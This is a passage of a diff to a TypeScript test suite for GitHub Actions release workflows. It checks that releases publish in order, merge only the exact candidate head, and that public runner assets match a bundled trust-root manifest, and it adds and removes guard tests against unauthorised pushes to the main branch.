+    writeFileSync(join(fixture.root, 'gh-state', 'state.json'), JSON.stringify(state));
+    const run = runMerge(fixture);
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /no successful Build & Test check/);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a PR head that moved after publication voids readiness before any check is consulted', () => {
+  const fixture = publishedFixture();
+  try {
+    const other = fullClone(fixture);
+    git(other, 'checkout', '--quiet', 'changeset-release/main');
+    write(other, 'README.md', 'rebased\n');
+    git(other, 'commit', '--quiet', '-am', 'rebase');
+    git(other, 'push', '--quiet', 'origin', 'changeset-release/main');
+    const state = fixture.gh.state();
+    state.checks[originRef(fixture, 'refs/heads/changeset-release/main')!] = [check('success')];
+    writeFileSync(join(fixture.root, 'gh-state', 'state.json'), JSON.stringify(state));
+    const run = runMerge(fixture);
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /head moved from the published candidate/);
+    assert.match(run.failed!.stderr, /published-but-not-advertised/);
+    assert.ok(!ghCalls(fixture).some((c) => c.includes('check-runs')));
+    assert.ok(!ghCalls(fixture).some((c) => c.startsWith('pr merge')));
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('publication order: a draft or absent release never merges even with a green check', () => {
+  const draft = createFixture({
+    prepared: true,
+    prs: [versionPr()],
+    releases: { [TAG]: { assets: {}, draft: true } },
+  });
+  try {
+    const state = draft.gh.state();
+    state.checks[draft.head!] = [check('success')];
+    writeFileSync(join(draft.root, 'gh-state', 'state.json'), JSON.stringify(state));
+    const run = runMerge(draft);
+    assert.equal(run.ok, false);
+    assert.equal(run.failed!.name, 'Require the public release from the exact candidate');
+    assert.ok(!ghCalls(draft).some((c) => c.startsWith('pr merge')));
+  } finally {
+    draft.cleanup();
+  }
+  const absent = createFixture({ prepared: true, prs: [versionPr()] });
+  try {
+    const run = runMerge(absent);
+    assert.equal(run.ok, false);
+    assert.equal(run.failed!.name, 'Require the public release from the exact candidate');
+  } finally {
+    absent.cleanup();
+  }
+});
+
+test('a tag that no longer points at H refuses the merge', () => {
+  const fixture = publishedFixture({ tags: { [TAG]: SHA_B } });
+  try {
+    const state = fixture.gh.state();
+    state.tags[TAG] = SHA_B;
+    state.checks[fixture.head!] = [check('success')];
+    writeFileSync(join(fixture.root, 'gh-state', 'state.json'), JSON.stringify(state));
+    const run = runMerge(fixture);
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /points at b{40}, not the candidate/);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+// --- ci.yml: postpublication public-asset assertion ---
+
+const CI_STEP = 'Published runner assets match the trust root';
+
+function runCi(
+  fixture: Fixture,
+  dir: string,
+  ctx: Record<string, string>,
+  env: Record<string, string> = {},
+) {
+  return runJobSteps({
+    workflow: ci,
+    jobId: 'core-tests',
+    cwd: dir,
+    ctx: {
+      'secrets.GITHUB_TOKEN': 'stub-token',
+      'github.repository': REPO,
+      'github.base_ref': '',
+      'github.event.before': '',
+      ...ctx,
+    },
+    env: { ...baseEnv(fixture), ...env },
+    only: [CI_STEP],
+  });
+}
+
+test('the release PR run asserts the public bytes of the version it advertises', () => {
+  const fixture = publishedFixture();
+  try {
+    const run = runCi(fixture, checkout(fixture, fixture.head!), { 'github.base_ref': 'main' });
+    assert.ok(run.ok, run.failed?.stderr);
+    assert.match(
+      stepStdout(run, CI_STEP),
+      /public runner assets for v0\.76\.7 match the trust root/,
+    );
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('before publication the release PR run fails on the missing release — the required check cannot pass early', () => {
+  const fixture = createFixture({ prepared: true });
+  try {
+    const run = runCi(fixture, checkout(fixture, fixture.head!), { 'github.base_ref': 'main' });
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /release v0\.76\.7 is not published/);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('an ordinary PR that keeps the base version and root stays offline', () => {
+  const fixture = createFixture();
+  try {
+    const run = runCi(fixture, checkout(fixture, 'main'), { 'github.base_ref': 'main' });
+    assert.ok(run.ok, run.failed?.stderr);
+    assert.match(stepStdout(run, CI_STEP), /staying offline/);
+    assert.deepEqual(ghCalls(fixture), []);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a manifest edit without a version bump still faces the public bytes', () => {
+  const fixture = createFixture();
+  try {
+    const dir = checkout(fixture, 'main');
+    for (const path of MANIFEST_PATHS)
+      write(dir, path, manifestFor(ADVERTISED, 'edited-ios', 'old-android'));
+    const run = runCi(fixture, dir, { 'github.base_ref': 'main' });
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /release v0\.76\.6 is not published/);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('the push of the merged version to main is asserted against the previous head', () => {
+  const fixture = publishedFixture();
+  try {
+    const run = runCi(fixture, checkout(fixture, fixture.head!), {
+      'github.event.before': fixture.base,
+    });
+    assert.ok(run.ok, run.failed?.stderr);
+    assert.ok(ghCalls(fixture).some((c) => c.startsWith('release download')));
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a failed asset transfer fails as itself, never as a missing or divergent public byte', () => {
+  const fixture = publishedFixture();
+  try {
+    const run = runCi(
+      fixture,
+      checkout(fixture, fixture.head!),
+      { 'github.base_ref': 'main' },
+      { GH_STUB_FAIL: 'release download' },
+    );
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /a failed transfer is not divergence/);
+    assert.doesNotMatch(run.failed!.stderr, /carries no|!= trust root/);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a stale root, tampered bytes, a wrong length, a missing zip, a draft or a divergent manifest asset all fail', () => {
+  const cases: Array<[string, (f: Fixture) => void, RegExp]> = [
+    [
+      'tampered',
+      (f) => writeFileSync(f.gh.assetPath(TAG, IOS_ZIP), 'tampered-bytes-same-len'),
+      /public sha256 .* != trust root/,
+    ],
+    [
+      'length',
+      (f) => writeFileSync(f.gh.assetPath(TAG, ANDROID_ZIP), ANDROID_BYTES + 'x'),
+      /public sha256|public length/,
+    ],
+    [
+      'missing',
+      (f) => {
+        const s = f.gh.state();
+        delete s.releases[TAG].assets[ANDROID_ZIP];
+        writeFileSync(join(f.root, 'gh-state', 'state.json'), JSON.stringify(s));
+      },
+      /carries no rn-android-runner/,
+    ],
+    [
+      'draft',
+      (f) => {
+        const s = f.gh.state();
+        s.releases[TAG].draft = true;
+        writeFileSync(join(f.root, 'gh-state', 'state.json'), JSON.stringify(s));
+      },
+      /not published/,
+    ],
+    [
+      'manifest',
+      (f) => writeFileSync(f.gh.assetPath(TAG, 'runner-manifest.json'), manifestFor(VERSION, 'x')),
+      /differs from the trust root/,
+    ],
+  ];
+  for (const [label, mutate, expected] of cases) {
+    const fixture = publishedFixture();
     try {
-      const workdir = checkout(fixture, 'build');
-      writeFileSync(join(workdir, asset), bytes);
-      const ctx = {
-        'needs.detect.outputs.version': VERSION,
-        'secrets.GITHUB_TOKEN': 'stub-token',
-      };
-      const only = ['Upload to the release'];
-      for (const attempt of [1, 2]) {
-        const run = runJobSteps({ workflow, jobId, cwd: workdir, ctx, env: fixture.gh.env, only });
-        assert.ok(run.ok, `attempt ${attempt} failed: ${run.failed?.stderr}`);
-      }
-      // Without --clobber the stub refuses the second upload, exactly as the
-      // release API does, so this proves the rerun path is idempotent.
-      assert.deepEqual(Object.keys(fixture.gh.state().releases[TAG].assets), [asset]);
-      assert.equal(fixture.gh.state().releases[TAG].assets[asset].uploads, 2);
-      assert.equal(readFileSync(fixture.gh.assetPath(TAG, asset), 'utf8'), bytes);
+      mutate(fixture);
+      const run = runCi(fixture, checkout(fixture, fixture.head!), { 'github.base_ref': 'main' });
+      assert.equal(run.ok, false, label);
+      assert.match(run.failed!.stderr, expected, label);
+      assert.ok(
+        !ghCalls(fixture).some((c) => c.startsWith('release upload')),
+        `${label}: CI never writes`,
+      );
     } finally {
       fixture.cleanup();
     }
+  }
+  const stale = createFixture({ prepared: true });
+  try {
+    const dir = checkout(stale, stale.head!);
+    for (const path of MANIFEST_PATHS) write(dir, path, manifestFor(ADVERTISED));
+    const run = runCi(stale, dir, { 'github.base_ref': 'main' });
+    assert.equal(run.ok, false);
+    assert.match(
+      run.failed!.stderr,
+      /vouches for v0\.76\.6 while plugin\.json advertises v0\.76\.7/,
+    );
+  } finally {
+    stale.cleanup();
+  }
+});
+
+// --- the sweep: verify, repair only a missing manifest asset ---
+
+const SWEEP_STEP =
+  "Public runner assets match main's trust root (repair a missing manifest asset only)";
+
+function runSweep(fixture: Fixture) {
+  return runJobSteps({
+    workflow: sweepWorkflow,
+    jobId: 'sweep',
+    cwd: checkout(fixture, fixture.head!),
+    ctx: { 'secrets.GITHUB_TOKEN': 'stub-token', 'github.repository': REPO },
+    env: baseEnv(fixture),
+    only: [SWEEP_STEP],
   });
 }
 
-test('the step runner honours working-directory and refuses fields it does not model', () => {
-  // The harness claims to run steps the way the runner does, so a step field it
-  // cannot reproduce has to fail loudly rather than be dropped — a later test
-  // would otherwise pass or fail for the wrong reason.
-  const root = mkdtempSync(join(tmpdir(), 'workflow-harness-'));
+test('the sweep re-attaches a missing manifest asset from the trust root and never touches a zip', () => {
+  const fixture = publishedFixture();
   try {
-    mkdirSync(join(root, 'nested'));
-    const harness = {
-      jobs: {
-        located: {
-          steps: [{ name: 'touch', run: 'touch marker', 'working-directory': 'nested' }],
-        },
-        unmodelled: { steps: [{ name: 'lenient', run: ':', 'continue-on-error': true }] },
-        pythonShell: { steps: [{ name: 'python', run: 'pass', shell: 'python' }] },
-        defaultShell: { steps: [{ name: 'pipeline', run: 'false | true' }] },
-        bashShell: { steps: [{ name: 'pipeline', run: 'false | true', shell: 'bash' }] },
-      },
-    } as unknown as Parameters<typeof runJobSteps>[0]['workflow'];
-
-    const run = runJobSteps({ workflow: harness, jobId: 'located', cwd: root, ctx: {} });
+    const state = fixture.gh.state();
+    delete state.releases[TAG].assets['runner-manifest.json'];
+    rmSync(fixture.gh.assetPath(TAG, 'runner-manifest.json'));
+    writeFileSync(join(fixture.root, 'gh-state', 'state.json'), JSON.stringify(state));
+    const run = runSweep(fixture);
     assert.ok(run.ok, run.failed?.stderr);
-    assert.ok(existsSync(join(root, 'nested', 'marker')), 'the step must run in working-directory');
-    assert.equal(existsSync(join(root, 'marker')), false);
-
-    assert.throws(
-      () => runJobSteps({ workflow: harness, jobId: 'unmodelled', cwd: root, ctx: {} }),
-      /does not model: continue-on-error/,
-    );
-    assert.throws(
-      () => runJobSteps({ workflow: harness, jobId: 'pythonShell', cwd: root, ctx: {} }),
-      /shell the harness does not model: python/,
-    );
-    // The runner's default shell has no pipefail; only `shell: bash` sets it. The
-    // harness must reproduce that, or a step relying on the stricter shell would
-    // pass here and swallow a failing pipeline in production.
+    assert.match(stepStdout(run, SWEEP_STEP), /re-attached the missing runner-manifest\.json/);
     assert.equal(
-      runJobSteps({ workflow: harness, jobId: 'defaultShell', cwd: root, ctx: {} }).ok,
-      true,
-      'the default shell must not set pipefail',
+      readFileSync(fixture.gh.assetPath(TAG, 'runner-manifest.json'), 'utf8'),
+      manifestFor(),
     );
-    assert.equal(
-      runJobSteps({ workflow: harness, jobId: 'bashShell', cwd: root, ctx: {} }).ok,
-      false,
-      '`shell: bash` must set pipefail',
-    );
+    const uploads = ghCalls(fixture).filter((c) => c.startsWith('release upload'));
+    assert.equal(uploads.length, 1);
+    assert.ok(!uploads[0].includes('.zip') && !uploads[0].includes('--clobber'));
   } finally {
-    rmSync(root, { force: true, recursive: true });
+    fixture.cleanup();
   }
 });
 
-// --- structural contract (assertions the simulation cannot make) ---
-
-// Allowlist, not blacklist: `git push origin HEAD` while checked out on main
-// writes to the default branch just as surely as naming it, and a global option
-// before the subcommand (`git -C . push ...`) must be rejected rather than
-// silently skipped. Only two shapes are permitted — writing the manifest branch,
-// and deleting a superseded one.
-const PERMITTED_PUSHES = [
-  ['git', 'push', 'origin', '$BRANCH'],
-  ['git', 'push', 'origin', '--delete', '$BRANCH'],
-  ['git', 'push', 'origin', '--delete', '$ref'],
-];
-
-// git's value-taking global options, so the subcommand is found rather than
-// guessed: `git -C . push` is a push, `git commit -m "... push ..."` is not.
-const GIT_GLOBAL_OPTIONS_WITH_VALUE = new Set([
-  '-C',
-  '-c',
-  '--git-dir',
-  '--work-tree',
-  '--namespace',
-  '--exec-path',
-  '--super-prefix',
-]);
-
-function gitSubcommand(tokens: string[]): string | undefined {
-  if (tokens[0] !== 'git') return undefined;
-  for (let i = 1; i < tokens.length; i++) {
-    if (!tokens[i].startsWith('-')) return tokens[i];
-    if (GIT_GLOBAL_OPTIONS_WITH_VALUE.has(tokens[i])) i++;
-  }
-  return undefined;
-}
-
-function isGitPush(tokens: string[]): boolean {
-  return gitSubcommand(tokens) === 'push';
-}
-
-function isPermittedPush(tokens: string[]): boolean {
-  return PERMITTED_PUSHES.some((allowed) => JSON.stringify(tokens) === JSON.stringify(allowed));
-}
-
-// A command that carries a push the parser cannot attribute to git — `xargs …
-// git push …`, `sh -c "git push …"`. Judged per COMMAND, never per line: a
-// permitted push sharing the line must not vouch for the one beside it. A git
-// command whose subcommand resolves (`git commit -m "… push …"`) is classified,
-// so prose is not mistaken for a carrier.
-function isUnrecognisedPushCarrier(tokens: string[]): boolean {
-  return tokens.includes('push') && gitSubcommand(tokens) === undefined;
-}
-
-// Everything a default-branch write could hide behind: a recognised push the
-// allowlist rejects, or a push the parser could not classify at all.
-function refusedPushForms(script: string): string[][] {
-  return shellCommands(script).filter(
-    (tokens) =>
-      isUnrecognisedPushCarrier(tokens) || (isGitPush(tokens) && !isPermittedPush(tokens)),
-  );
-}
-
-test('every push targets the version-derived manifest branch, never a default-branch ref', () => {
-  // The simulation proves what the delivery path DOES; this proves what no path
-  // anywhere in the workflow may do — reach the default branch — including jobs
-  // and branches the simulation never enters. Commands are compared as
-  // normalised token arrays, so quoting or ${BRANCH} spelling does not matter.
-  const pushes = everyStep().flatMap(({ jobId, step }) =>
-    shellCommands(step.run ?? '')
-      .filter(isGitPush)
-      .map((tokens) => ({ jobId, tokens })),
-  );
-  assert.ok(pushes.length > 0, 'the manifest has to be pushed somewhere');
-  for (const { jobId, tokens } of pushes) {
-    assert.ok(isPermittedPush(tokens), `${jobId} pushes somewhere unexpected: ${tokens.join(' ')}`);
-  }
-  assert.ok(
-    pushes.some(({ tokens }) => JSON.stringify(tokens) === JSON.stringify(PERMITTED_PUSHES[0])),
-    'the manifest branch must be pushed',
-  );
-});
-
-test('the push allowlist rejects default-branch writes however they are spelled', () => {
-  // A guard that silently skips what it cannot parse is not a guard: each of
-  // these must be SEEN as a push and REFUSED, not filtered out of the check.
-  const forbidden = [
-    'git push origin HEAD:main',
-    'git push origin HEAD',
-    'git push origin main',
-    'git -C . push origin HEAD:main',
-    'git -c user.name=x push origin main',
-    'git --git-dir=.git push origin main',
-    'git push --force origin "$BRANCH"',
-    'git push origin "${BRANCH}:main"',
-    'if [ -n "$x" ]; then git push origin HEAD:main; fi',
-    'if git push origin main; then :; fi',
-    'if ! git push origin HEAD:main; then :; fi',
-    'while git push origin main; do :; done',
-    'until git push origin HEAD:main; do :; done',
-    'do git push origin main',
-    'command git push origin main',
-    'env GIT_DIR=.git git push origin main',
-    'GIT_DIR=.git git push origin HEAD:main',
-    '! git push origin HEAD:main',
-    'out=$(git push origin HEAD:main)',
-    'if ! out=$(git push origin HEAD:main); then :; fi',
-    'eval "git push origin main"',
-    'echo x | xargs -I{} git push origin HEAD:main',
-    'git push origin "$BRANCH" && echo main | xargs -I{} git push origin HEAD:{}',
-  ];
-  for (const line of forbidden) {
-    assert.ok(
-      refusedPushForms(line).length > 0,
-      `neither refused by the allowlist nor flagged as unclassifiable: ${line}`,
-    );
-  }
-  for (const line of ['git push origin "$BRANCH"', 'then git push origin "${BRANCH}"']) {
-    assert.deepEqual(refusedPushForms(line), [], `a required push was refused: ${line}`);
-    assert.equal(shellCommands(line).filter(isGitPush).length, 1, `not recognised: ${line}`);
-  }
-  // Prose that merely says the word is neither a push nor an unclassifiable
-  // carrier — the classifier resolves `git commit`, so it is not policed.
-  for (const line of ['git commit -m "chore: push the trust root"', 'gh pr merge --auto 1']) {
-    assert.deepEqual(refusedPushForms(line), [], `not a push, must not be policed: ${line}`);
-    assert.deepEqual(shellCommands(line).filter(isGitPush), []);
+test('the sweep fails on divergent public bytes instead of rebuilding or replacing them', () => {
+  const fixture = publishedFixture();
+  try {
+    writeFileSync(fixture.gh.assetPath(TAG, IOS_ZIP), 'rebuilt-by-someone-else');
+    const run = runSweep(fixture);
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /public sha256 .* != trust root/);
+    assert.ok(!ghCalls(fixture).some((c) => /^release (upload|create|edit|delete)/.test(c)));
+  } finally {
+    fixture.cleanup();
   }
 });
 
-test('no command carries a push the allowlist cannot classify', () => {
-  // The backstop for the guard above. Round after round, a push spelling the
-  // parser could not see was silently EXEMPT from the allowlist rather than
-  // refused. A guard that skips what it cannot parse is not a guard, so a
-  // COMMAND that carries the word `push` without resolving to a git subcommand
-  // fails here as unclassifiable. Judged per command, so a permitted push
-  // elsewhere on the same line cannot vouch for it.
-  const carriers = everyStep().flatMap(({ jobId, step }) =>
-    shellCommands(step.run ?? '')
-      .filter(isUnrecognisedPushCarrier)
-      .map((tokens) => `${jobId}: ${tokens.join(' ')}`),
-  );
-  assert.deepEqual(
-    carriers,
-    [],
-    'these carry a push the parser did not recognise — teach it the spelling, do not skip it',
-  );
-  // A push handed to another program is caught even when a permitted push shares
-  // the line, which is precisely what a per-line check let through.
-  assert.deepEqual(
-    refusedPushForms('git push origin "$BRANCH" && echo main | xargs -I{} git push origin HEAD:{}'),
-    [['xargs', '-I{}', 'git', 'push', 'origin', 'HEAD:{}']],
-  );
-  assert.deepEqual(refusedPushForms('git push origin "$BRANCH"'), []);
-});
+// --- the producer ---
 
-test('the publish job is permitted to open a pull request', () => {
-  const permissions = workflow.jobs['publish-manifest'].permissions ?? {};
-  assert.equal(permissions['pull-requests'], 'write');
-  assert.equal(permissions.contents, 'write');
-});
-
-test('the manifest branch comes from the detect decision, not a literal', () => {
-  const env = workflow.jobs['publish-manifest'].env ?? {};
-  assert.equal(env.BRANCH, '${{ needs.detect.outputs.branch }}');
-  assert.equal(env.VERSION, '${{ needs.detect.outputs.version }}');
-});
-
-test('every job builds and publishes from main, never from the dispatching ref', () => {
-  const checkouts = everyStep().filter(({ step }) =>
-    (step.uses ?? '').startsWith('actions/checkout'),
-  );
-  assert.equal(checkouts.length, 4, 'each job checks out once');
-  for (const { jobId, step } of checkouts) {
-    assert.equal(step.with?.ref, 'main', `${jobId} would publish from the dispatching ref`);
-  }
-});
-
-test('publication is serialised repository-wide, not per triggering ref', () => {
-  assert.equal(workflow.concurrency, 'runner-artifacts');
-  assert.doesNotMatch(
-    String(workflow.concurrency),
-    /github\.ref/,
-    'a dispatch from another ref would race the sweep over the same release and branch',
-  );
-});
-
-test('publish still runs when both builds are skipped (the stale-manifest self-heal)', () => {
-  const condition = (workflow.jobs['publish-manifest'].if ?? '').replace(/\s+/g, ' ');
-  assert.match(condition, /needs\.detect\.outputs\.publish == 'true'/);
-  // `contains(... 'skipped' ...)` must ADMIT a skipped build; merely mentioning
-  // the word would also match a condition that rejects it.
-  for (const job of ['build-ios', 'build-android']) {
-    assert.match(
-      condition,
-      new RegExp(
-        `contains\\(fromJSON\\('\\["success","skipped"\\]'\\), needs\\.${job}\\.result\\)`,
-      ),
-      `a complete release skips ${job} — publish must still run`,
-    );
-  }
-  assert.doesNotMatch(
-    condition,
-    /!\s*contains\(/,
-    'the skipped states must be admitted, not denied',
-  );
-  assert.deepEqual(workflow.jobs['publish-manifest'].needs, [
-    'detect',
-    'build-ios',
-    'build-android',
-  ]);
-  // A status-check function in an `if:` drops the implicit success() on needs,
-  // so a detect that wrote its decision and then failed a later step would
-  // otherwise publish with both build jobs skipped — downloading and blessing
-  // the very zips the decision asked to have rebuilt.
-  assert.match(condition, /needs\.detect\.result == 'success'/);
-});
-
-test('the build jobs are gated on the detect decision', () => {
+test('the producer refuses anything but a full candidate SHA before checking out', () => {
   for (const jobId of ['build-ios', 'build-android']) {
-    assert.equal(workflow.jobs[jobId].if, "needs.detect.outputs.build == 'true'");
-    assert.deepEqual(workflow.jobs[jobId].needs, 'detect');
+    for (const [ref, ok] of [
+      [SHA_A, true],
+      ['main', false],
+      ['', false],
+      [SHA_A.slice(0, 12), false],
+      ['refs/heads/main', false],
+    ] as const) {
+      const run = runJobSteps({
+        workflow: artifacts,
+        jobId,
+        cwd: repoRoot,
+        ctx: { 'inputs.ref': ref },
+        env: {},
+        only: ['Refuse anything but a full candidate SHA'],
+      });
+      assert.equal(run.ok, ok, `${jobId} ref='${ref}'`);
+    }
+  }
+});
+
+// --- structure pinned across both workflows ---
+
+// Global options never hide a subcommand: `git -c k=v push` and
+// `gh -R owner/repo pr merge` match the same as their bare spellings.
+function withoutGlobalOptions(tokens: string[]): string[] {
+  const out = [...tokens];
+  if (out[0] === 'git') {
+    while (out.length > 1 && out[1].startsWith('-')) {
+      out.splice(
+        1,
+        out[1].startsWith('--') && out[1].includes('=')
+          ? 1
+          : /^-(c|C)$|^--(git-dir|work-tree|namespace)$/.test(out[1])
+            ? 2
+            : 1,
+      );
+    }
+  } else if (out[0] === 'gh') {
+    while (out.length > 1 && out[1].startsWith('-')) {
+      out.splice(1, /^(-R|--repo)$/.test(out[1]) ? 2 : 1);
+    }
+  }
+  return out;
+}
+
+function everyRun(workflow: Workflow): Array<{ jobId: string; step: WorkflowStep }> {
+  return Object.entries(workflow.jobs).flatMap(([jobId, job]) =>
+    (job.steps ?? []).flatMap((step) => (step.run ? [{ jobId, step }] : [])),
+  );
+}
+
+test('the producer is a read-only callable: no release writes, no branch pushes, no persisted credential', () => {
+  assert.deepEqual(artifacts.permissions, { contents: 'read' });
+  // GitHub validates a called workflow's nested-job permissions against the
+  // CALLING job at run startup and ignores the nested `if:`, so any job here
+  // asking for more than the caller's contents: read rejects every release run.
+  assert.deepEqual(
+    Object.fromEntries(Object.entries(artifacts.jobs).map(([id, job]) => [id, job.permissions])),
+    { 'build-ios': undefined, 'build-android': undefined },
+  );
+  for (const jobId of ['build-ios', 'build-android']) {
+    const job = artifacts.jobs[jobId];
+    const checkoutStep = (job.steps ?? []).find((s) => s.uses?.startsWith('actions/checkout@'));
+    assert.equal(checkoutStep?.with?.ref, '${{ inputs.ref }}');
+    assert.equal(String(checkoutStep?.with?.['persist-credentials']), 'false');
+    for (const step of job.steps ?? []) {
+      if (!step.run) continue;
+      for (const tokens of shellCommands(step.run).map(withoutGlobalOptions)) {
+        assert.notEqual(tokens[0], 'gh', `${jobId}: ${tokens.join(' ')}`);
+        assert.ok(!(tokens[0] === 'git' && tokens[1] === 'push'), `${jobId}: ${tokens.join(' ')}`);
+      }
+    }
+  }
+  const on = (artifacts as unknown as { on: Record<string, unknown> }).on;
+  assert.deepEqual(Object.keys(on), ['workflow_call'], 'callable only: no mutable-main builds');
+  const sweepOn = (sweepWorkflow as unknown as { on: Record<string, unknown> }).on;
+  assert.deepEqual(Object.keys(sweepOn).sort(), ['schedule', 'workflow_dispatch']);
+  assert.deepEqual(sweepWorkflow.permissions, { contents: 'read' });
+  assert.deepEqual(sweepWorkflow.jobs.sweep.permissions, { contents: 'write' });
+  assert.match(String(sweepWorkflow.jobs.sweep.if), /github\.ref == 'refs\/heads\/main'/);
+  const sweepCheckout = (sweepWorkflow.jobs.sweep.steps ?? []).find((s) =>
+    s.uses?.startsWith('actions/checkout@'),
+  );
+  assert.equal(sweepCheckout?.with?.ref, 'main');
+  assert.equal(String(sweepCheckout?.with?.['persist-credentials']), 'false');
+});
+
+test('no step in either workflow clobbers a release asset, arms auto-merge or pushes main', () => {
+  for (const workflow of [release, artifacts, sweepWorkflow]) {
+    for (const { jobId, step } of everyRun(workflow)) {
+      for (const tokens of shellCommands(step.run!).map(withoutGlobalOptions)) {
+        const line = tokens.join(' ');
+        assert.ok(!tokens.includes('--clobber'), `${jobId}: ${line}`);
+        assert.ok(
+          !(
+            tokens[0] === 'gh' &&
+            tokens[1] === 'pr' &&
+            tokens[2] === 'merge' &&
+            tokens.includes('--auto')
+          ),
+          `${jobId}: ${line}`,
+        );
+        if (tokens[0] === 'git' && tokens[1] === 'push') {
+          assert.ok(
+            tokens.some((t) => t.startsWith('HEAD:refs/heads/changeset-release/main')),
+            `${jobId}: ${line}`,
+          );
+          assert.ok(
+            tokens.some((t) =>
+              t.startsWith('--force-with-lease=refs/heads/changeset-release/main:'),
+            ),
+            `${jobId}: ${line}`,
+          );
+        }
+      }
+    }
+  }
+});
+
+test('the release transaction is ordered: prepare -> finalize -> validate -> publish -> merge, merge by exact head', () => {
+  assert.equal(release.jobs.prepare.needs, 'version');
+  assert.equal(
+    (release.jobs.prepare as unknown as { uses: string }).uses,
+    './.github/workflows/runner-artifacts.yml',
+  );
+  assert.deepEqual(release.jobs.prepare.permissions, { contents: 'read' });
+  for (const [id, job] of Object.entries(artifacts.jobs)) {
+    for (const [scope, level] of Object.entries(job.permissions ?? {})) {
+      assert.ok(
+        scope === 'contents' && level !== 'write',
+        `nested job "${id}" requests ${scope}: ${level}, exceeding prepare's contents: read`,
+      );
+    }
+  }
+  assert.deepEqual(release.jobs.finalize.needs, ['version', 'prepare']);
+  assert.deepEqual(release.jobs.validate.needs, ['version', 'prepare', 'finalize']);
+  assert.deepEqual(release.jobs.publish.needs, ['version', 'prepare', 'finalize', 'validate']);
+  assert.deepEqual(release.jobs.merge.needs, ['version', 'finalize', 'publish']);
+  assert.match(String(release.jobs.publish.if), /needs\.validate\.result == 'success'/);
+  assert.match(String(release.jobs.merge.if), /needs\.publish\.result == 'success'/);
+  const mergeStep = steps(release, 'merge').find((s) => s.name === 'Merge exactly the candidate');
+  assert.ok(
+    shellCommands(mergeStep!.run!).some(
+      (t) =>
+        t[0] === 'gh' && t[1] === 'pr' && t[2] === 'merge' && t.includes('--match-head-commit'),
+    ),
+  );
+  const artifactSteps = [...steps(release, 'finalize'), ...steps(release, 'publish')].filter((s) =>
+    s.uses?.startsWith('actions/download-artifact@'),
+  );
+  assert.equal(artifactSteps.length, 2);
+  for (const step of artifactSteps) {
+    assert.match(
+      String(step.with?.['artifact-ids']),
+      /needs\.prepare\.outputs\.ios-artifact-id.*needs\.prepare\.outputs\.android-artifact-id/,
+    );
+  }
+  for (const name of [RETIRE_STEP]) {
+    assert.equal(
+      steps(release, 'publish').find((s) => s.name === name)?.if,
+      "steps.decide.outputs.action == 'replace-draft'",
+    );
+  }
+  for (const name of [STAGE_STEP, PUBLISH_STEP]) {
+    assert.equal(
+      steps(release, 'publish').find((s) => s.name === name)?.if,
+      "steps.decide.outputs.action == 'publish' || steps.decide.outputs.action == 'replace-draft'",
+    );
   }
   assert.equal(
-    steps('detect').find((s) => s.name?.startsWith('Create the release'))?.if,
-    "steps.v.outputs.build == 'true'",
+    steps(release, 'publish').find((s) => s.name === READBACK_STEP)?.if,
+    undefined,
+    'read-back runs on every path',
   );
+  assert.ok(stepNames(release, 'version').includes(PENDING_STEP));
+  const changesets = steps(release, 'version').find((s) =>
+    s.uses?.startsWith('changesets/action@'),
+  );
+  assert.equal(changesets?.if, "steps.pending.outputs.resume != 'true'");
+});
+
+test('the public-asset assertion feeds the required Build & Test aggregate through core-tests', () => {
+  assert.ok(stepNames(ci, 'core-tests').includes(CI_STEP));
+  assert.ok((ci.jobs.test.needs as string[]).includes('core-tests'));
+  assert.equal((ci.jobs.test as unknown as { name: string }).name, 'Build & Test');
+  assert.ok(existsSync(join(repoRoot, 'scripts', 'check-public-runner-assets.sh')));
+});
+
+// --- the whole transaction: main never advertises a version its bundled trust
+// root does not describe, and the named zips are already public when it does ---
+
+const trace = process.env.RELEASE_TRUST_ROOT_TRANSCRIPT ? console.log : () => {};
+
+function rootOf(fixture: Fixture, ref: string): { version: string; ios: string; android: string } {
+  const root = JSON.parse(
+    git(fixture.root, '--git-dir', fixture.origin, 'show', `${ref}:runner-manifest.json`),
+  );
+  return {
+    version: root.version,
+    ios: `${root.assets.ios[0].name} sha256=${root.assets.ios[0].sha256.slice(0, 12)}… ${root.assets.ios[0].bytes}B`,
+    android: `${root.assets.android[0].name} sha256=${root.assets.android[0].sha256.slice(0, 12)}… ${root.assets.android[0].bytes}B`,
+  };
+}
+
+function advertisedVersion(fixture: Fixture, ref: string): string {
+  return JSON.parse(
+    git(
+      fixture.root,
+      '--git-dir',
+      fixture.origin,
+      'show',
+      `${ref}:packages/claude-plugin/plugin.json`,
+    ),
+  ).version;
+}
+
+test('end to end: the first main commit advertising V carries V’s trust root and its zips are already public', () => {
+  const fixture = createFixture({ prs: [versionPr()] });
+  try {
+    trace(
+      `main before      ${fixture.base.slice(0, 12)} advertises ${advertisedVersion(fixture, 'refs/heads/main')}, root ${rootOf(fixture, 'refs/heads/main').version}`,
+    );
+
+    const pending = runVersionStep(fixture, PENDING_STEP);
+    assert.ok(pending.ok, pending.failed?.stderr);
+    assert.notEqual(pending.outputs.pending.resume, 'true');
+    const pinned = runVersionStep(fixture, CANDIDATE_STEP);
+    assert.ok(pinned.ok, pinned.failed?.stderr);
+    assert.equal(pinned.outputs.candidate.version, VERSION);
+
+    // P is what the pre-fix transaction merged: it advertises V while the
+    // bundled trust root still describes V-1 and no zip for V is public.
+    assert.equal(advertisedVersion(fixture, fixture.candidate), VERSION);
+    assert.equal(rootOf(fixture, fixture.candidate).version, ADVERTISED);
+    assert.equal(fixture.gh.state().releases[TAG], undefined);
+    trace(
